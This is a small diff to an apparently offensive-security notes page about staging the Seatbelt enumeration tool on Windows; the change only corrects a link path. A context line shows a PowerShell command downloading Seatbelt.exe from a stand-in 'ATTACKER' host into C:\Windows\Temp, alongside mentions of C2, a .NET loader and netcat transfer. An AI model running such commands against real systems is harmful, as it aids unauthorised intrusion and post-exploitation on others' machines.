@@ -19,7 +19,7 @@
 iwr -Uri http://ATTACKER/Seatbelt.exe -OutFile C:\Windows\Temp\sb.exe
 ```
 
-Prefer the in-memory route below where you have a C2 or a .NET loader. Transfer channels: [smb](../Tools/smb.md), [netcat](../Shell/netcat.md).
+Prefer the in-memory route below where you have a C2 or a .NET loader. Transfer channels: [smb](../Protocols/smb.md), [netcat](../Shell/netcat.md).
 
 ## Run it
 
